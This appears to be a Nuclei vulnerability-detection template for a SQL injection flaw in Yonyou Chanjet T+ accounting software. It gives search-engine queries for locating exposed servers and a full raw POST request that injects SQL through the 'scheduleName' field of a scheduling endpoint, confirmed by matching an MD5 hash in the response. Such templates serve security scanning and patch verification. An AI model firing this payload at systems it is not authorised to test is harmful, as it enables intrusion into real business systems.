id: yonyou-chanjet-tplus-updateschedule-sqli

info:
  name: yonyou-chanjettplus - SQL Injection
  author: hufei
  severity: high
  description: |
    There is an SQL injection vulnerability in the Changjetcrm financial crm system under Yonyou.
  reference:
    None
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="畅捷通-TPlus"
    hunter-query: app.name="畅捷通 T+"
  tags: chanjet,sqli,yonyou

http:
  - raw:
      - |
        POST /tplus/ajaxpro/Ufida.T.SM.UIP.ScheduleManage.ScheduleManageController,Ufida.T.SM.UIP.ashx?method=UpdateSchedule HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Content-Length: 107
    
        { "scheduleName": "' AND 1 IN (SELECT sys.fn_varbintohexstr(hashbytes('MD5','1'))) AND '1'='1", "timeStr": "" }

    matchers:
      - type: word
        part: body
        words:
          - "0x06d49632c9dc9bcb62aeaef99612ba6b"